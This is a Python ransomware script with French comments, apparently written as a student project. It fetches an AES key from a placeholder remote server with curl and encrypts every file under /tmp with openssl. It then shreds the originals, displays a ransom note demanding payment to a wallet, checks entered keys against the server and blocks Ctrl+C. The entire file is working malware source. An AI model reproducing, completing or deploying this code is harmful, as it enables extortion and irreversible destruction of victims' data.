#!/bin/python3

__author__ = "Joyston Anton Raveendran, Roger Priou"
__copyright__ = ""
__credits__ = [""]
__license__ = ""
__version__ = "1.5"
__maintainer__ = ""
__email__ = "joyston.antonraveendran@edu.esiee.fr, roger.priou@edu.esiee.fr"
__status__ = "Production"

#------------------------ Librairie à importer -----------------------#
import os, signal
# `pip install SecureString`
# si erreur openssl/crypto.h manquant alors `apt install libssl-dev`
import SecureString
#------------------------- Variables Globales ------------------------#
key = str
iv = ['IV A METTRE']
token = str
evil_message = """
=========================================================================
|				ATTENTION				|
=========================================================================

\t\tVotre système de fichiers a été chiffré,
\t\tpour pouvoir récupérer vos données il
\t\tvous faut entrer la clé de déchiffrement.

\t\tPour la récupérer il vous faut nous envo-
\t\tyé [montant] [devise] à notre [wallet]
\t\tavant le [date].

\t\tEntrer la clé ci-dessous :
"""
msg_echec = """

=========================================================================

\t\tMauvaise réponse...c'est bientôt la fin.

\t\tEssai(s) : """

msg_reussite = """

=========================================================================

\t\tBravo, vos fichiers sont en train d'être
\t\tdéchiffré, vous pourrez bientôt les réutiliser.

"""
#----------------------------- Fonction ------------------------------#
def recuperation_cle():

	"""

		recuperation_cle() :

		Fonction qui récupère sur un serveur les informations permettant le chiffrement des données :
			- une clé
			- un iv

		Ces données sont stockés sur un serveur distant Apache nous appartenant sur lequel nous avons mis 
		un fichier php qui revoie la clé suite à la demande de l'utilisateur.

		Une fois les informations récupérées elles sont stockées dans les variables globales adéquates

	"""

	global key, token
	
	nom_fichier = "/tmp/14f802e1fba977727845e8872c1743a7"
	token = 'evilransomware'

	# la commande curl permet de communiquer avec le serveur distant afin de récupérer les données demandées par l'utilisateur 
	# on utilise l'option --silent pour passer sous silence la bar de progression de la commande curl
	os.system('curl --silent http://[serveur_disant]/ask_key.php?token=' + token + ' > ' + nom_fichier)

	# on ouvre le fichier que l'on vient de téléchargé et on en extrait la première ligne qui
	# contient la clé et l'iv séparé par une virgule
	with open(nom_fichier, 'r') as file:
		key = file.read()
		file.flush()
		file.close()

	# on supprime le fichier contenant la clé et le iv 
	suppression(nom_fichier)

def creation_arbre():

	"""

		creation_arbre() :
		
		Fonction qui permet la création d'un fichier dans lequel il va y avoir la liste de tous les
		fichiers à chiffrer mais également les dossiers dans lesquels ils se trouvent, pour cela nous
		faisons appel à la commande système ls

		Le format du fichier est le suivant :
		
		========================
		.:
		fichier1.ext
		fichier2.ext

		./dossier1:
		fichier3.ext

		./dossier2:
		fichier4.ext
		sous_dossier2/
		========================

	"""

	nom_arbre = 'c0af77cf8294ff93a5cdb2963ca9f038'

	# création d'une liste comportant tous les dossiers/fichiers contenus dans le dossier /tmp
	#
	# option -1 de ls qui permet d'afficher uniquement le nom du dossier à chaque ligne précédé du nom du
	# dossier qui les contient './nom/du/dossier:'
	#
	# option -R de ls qui permet la récursivité de la commande '2> /dev/null' qui permet de ne pas afficher
	# les erreurs notamment de permission denied qui peuvent apparaître si l'utilisateur qui exécute le script
	# n'a pas les droits pour accéder aux fichiers
	#
	# option -p de ls qui permet de rajouter un '/' à la fin des objets qui sont des dossiers

	os.system('ls -1pR /tmp 2> /dev/null > /tmp/' + nom_arbre)

	return '/tmp/' + nom_arbre

def parcours_arbre(arbre, option=1, local_key=key):

	"""

		parcours_arbre(arbre) :

		paramètre :
			- arbre : chemin absolu du fichier contenant tous les fichiers et dossier du processus

		Fonction qui va parcourir tous les fichiers à chiffrer pour le processus qui sont présents dans
		le fichier arbre créé plutôt

	"""

	with open(arbre, 'r') as file:
		datas = file.readlines()
		file.flush()
		file.close()

	# on initialise les variables pour les différents fichiers et répertoires
	repertoire = ''
	changer_repertoire = True
	fichier = str

	# parcours de toutes les lignes (cf structure dans la fonction creation_arbre()) sauf de la première
	# qui est le dossier courant (/tmp)
	for ligne in datas:
		# si la ligne est un saut de ligne on met le flag pour changer le nom du répertoire à la prochaine boucle
		if (ligne == '\n'):
			changer_repertoire = True
			continue
		# si le flag changer_repertoire est True alors on récupère le nom du sous-dossier
		elif changer_repertoire:
			repertoire = ligne[1:-2].replace(' ', '\\ ').replace('\'', '') + '/'
			changer_repertoire = False
			continue
		# on ne chiffre pas si c'est un dossier
		elif (ligne[len(ligne)-2]=='/'):
			continue
		# on ne chiffre pas le fichier contenant les fichiers (arbres)
		elif (ligne[:-1]=='c0af77cf8294ff93a5cdb2963ca9f038'):
			continue
		# on ne chiffre pas le ransomware
		elif (ligne[:-1]=='ransomware.py'):
			continue
		# on récupère le fichier et on lance le chiffrement en constituant le chemin absolu du fichier
		else:
			fichier = ligne[:-1].replace(' ', '\\ ').replace('\'', '').replace('(', '\(').replace(')', '\)')
			crypto('/' + repertoire + fichier, option, local_key)

def crypto(fichier, option, local_key=key):

	"""
		
		crypto(fichier, option, local_key=key) :

		paramètres :
			- fichier : chemin absolu du fichier sous forme de chaîne de caractère
			- option : vaut 1 ou 0 et spécifie si l'opération à faire est du chiffrement (1) ou du
			  déchiffrement (0)
			- local_key [facultatif] : clé utilisé pour le déchiffrement et donc passé en paramètre puisque
		spécifiée par l'utilisateur sinon c'est la clé récupérée sur le serveur qui est utilisée
		
		Fonction qui permet le chiffrement ou le déchiffrement d'un fichier via son chemin absolu et une
		clé quand il s'agit du déchiffrement de l'utilisateur. L'algorithme utilisé est l'AES-256-CBC.

	"""
	print(fichier)
	# cas du chiffrement
	if (option==1):
		os.system('openssl enc -e -aes-256-cbc -in ' + fichier + ' -out ' + fichier + '.enc -K ' + key + ' -iv ' + iv + " 2> /dev/null")
	# cas du déchiffrement
	elif (option==0):
		os.system('openssl enc -d -aes-256-cbc -in ' + fichier + ' -out ' + fichier[:-4] + ' -K ' + local_key + ' -iv ' + iv + " 2> /dev/null")

	suppression(fichier)

def suppression(fichier): 

	"""

		suppression(fichier) :

		paramètre :
			- fichier : chemin absolu du fichier sous forme de chaîne de caractère

		Fonction qui permet la suppression sécurisée d'un fichier via son chemin absolu en utilisant
		l'appel système shred

	"""

	os.system('shred -uz ' + fichier + ' &> /dev/null')

def fin_chiffrement(arbre): 

	"""

		fin_chiffrement(arbre) :

		paramètre :
			- arbre : chemin absolu du fichier contenant tous les fichiers et dossier du processus

		Fonction qui supprime l'ensemble des informations sensibles du ransomware :
			- fichier qui contient les fichiers et les dossiers
			- la clé de chiffrement

	"""

	global key

	# on fait appel à la méthode clearmem qui permet de supprimer proprement une variable
	# nous avions la possibilité d'utiliser un bytearray() car ces derniers sont mutable en Python
	# ainsi il suffit de réécrire des zéros sur les valeurs une fois les opérations terminées
	# néanmoins la manipulation de ce dernier pour récupérer en chaîne de caractère ce que le bytearray
	# contient (pour l'utiliser dans les commandes par exemple) n'est pas facile

	# pour tester si les les valeurs sensibles comme la clé sont bien supprimées de la mémoire nous
	# avons fait un petit programme et utiliser os.abort() et au préalable `ulimit -c unlimited` qui nous
	# permet de récupérer un dump une fois le programme interrompu volontairement à la fin

	# grâce à cela nous pouvons affirmer que l'utilisation simple de :
	# var = None
	# del var
	# n'est pas suffisant car les valeurs se retrouvent tout de même dans la mémoire

	# src : https://www.sjoerdlangkemper.nl/2016/06/09/clearing-memory-in-python/
	SecureString.clearmem(key)
	del key

	# appel de la fonction suppression() pour supprimer le fichier 'arbre'
	suppression(arbre)

def attente_cle(essai = 0):

	"""

		attente_cle() :

		Fonction qui récupère la clé envoyée par l'utilisateur pour le déchiffrement et affiche également
		un message d'information

	"""

	# affichage du message
	if (essai == 0):
		os.system('clear')
		print(evil_message)

	utilisateur_cle = input('> ')

	# test de la clé de déchiffrement
	verification = test_cle(utilisateur_cle)

	if verification=='1':
		print(msg_reussite)
		arbre = creation_arbre()
		parcours_arbre(arbre, 0, utilisateur_cle)
		suppression(arbre)
		exit(1)
	elif verification=='0':
		print(msg_echec, end='')
		print(str(essai + 1) + '\n')
		attente_cle(essai + 1)
	else:
		attente_cle(essai + 1)

def test_cle(cle):

	"""

		test_cle(cle) :

		Fonction qui vérifie la clé envoyée par l'utilisateur pour le déchiffrement en comparant la valeur 
		sur le serveur distant Apache

	"""
	
	# envoie de la requête vers le serveur pour vérifier si la clé est bonne utilisation de la fonction
	# popen().read() qui permet de récupérer la sortie standard d'une commande et non si cette commande
	# s'est bien exécutée
	verify_key = os.popen('curl --silent http://[serveur_distant]/verify_key.php/?key='+cle).read()
	return verify_key

def main():

	"""

		main() :

		Fonction de traitement principale du ransomware

	"""

	# récupération de la clé sur le serveur distant
	recuperation_cle()

	# création d'une liste comportant tous les dossiers/fichiers contenus dans le dossier /tmp
	nom_arbre = creation_arbre()

	# on parcourt tous les fichiers à chiffrer et on aplique le chiffrement
	parcours_arbre(nom_arbre)

	# on fait les actions de fin de chiffrement
	fin_chiffrement(nom_arbre)

	# on affiche le message de fin pour l'utilisateur
	attente_cle()

	# on affiche le message de fin pour l'utilisateur
	attente_cle()

# Fonction qui est appelée quand le signal du CTRL+C est levé

def catch_ctrl_C(sig,frame):
	return 0

#---------------------------- Traitement ---------------------------#

if __name__ == '__main__':

	# permet lever un signal lorsque l'utilisateur fait un CTRL+C et appel
	# la fonction catch_ctrl_C()
	#
	# src : https://www.raspberrypi.org/forums/viewtopic.php?t=46902
	signal.signal(signal.SIGINT, catch_ctrl_C)

	main()
